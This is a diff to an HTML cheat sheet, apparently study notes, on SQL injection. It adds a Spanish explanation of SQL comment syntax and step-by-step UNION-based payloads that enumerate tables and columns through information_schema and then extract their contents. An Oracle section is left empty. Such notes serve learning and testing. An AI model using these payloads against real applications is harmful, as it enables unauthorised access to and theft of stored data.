@@ -58,11 +58,6 @@
   	color: gray;
 	}
 
-    marca {
-	background-color: red;
-  	color: black;
-    }
-
     details[open] summary {
       background: black;
       color: gray;
@@ -114,9 +109,12 @@
 <summary>DATABASE TYPE/VERSION TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> Techniques used to retrieve the database version.
 
+-- or # | dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este 
+después de los símbolos, se ignora.
+
 <b>PRE-REQS:</b>
 1. get column number
-<b>method1:</b><mark style="marca">' ORDER BY 1--</mark>
+<b>method1:</b><mark>' ORDER BY 1--</mark>
 <b>method2:</b><mark>' UNION SELECT NULL--</mark>
 	
 2. get field type
@@ -138,7 +136,35 @@ is needed.
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<p><b>DESCRIPTION:</b> Used to retrieve the name of table, columns, etc. to retrieve content from database. 
+<details>
+<summary>NON-ORACLE</summary>
+<b>PRE-REQS:</b>
+1. get column number
+2. get field type
+
+*after that information is collected, it is time to retrieve the table_name of the database schema.
+
+<mark>' UNION SELECT table_name,NULL from information_schema.tables--</mark>
+
+*once table is identified, it is time to retrieve the columns of the table
+
+<mark>' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark>
+
+*once table_name and columns are identified, it is time to retrieve the content
+
+<mark>' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
+</details>
+<details>
+<summary>ORACLE</summary>
+
+
+
+
+	
+</details>
+	
+</p>
 </details>
 <details>
 <summary>UNION ATTACKS TECHNIQUES</summary>
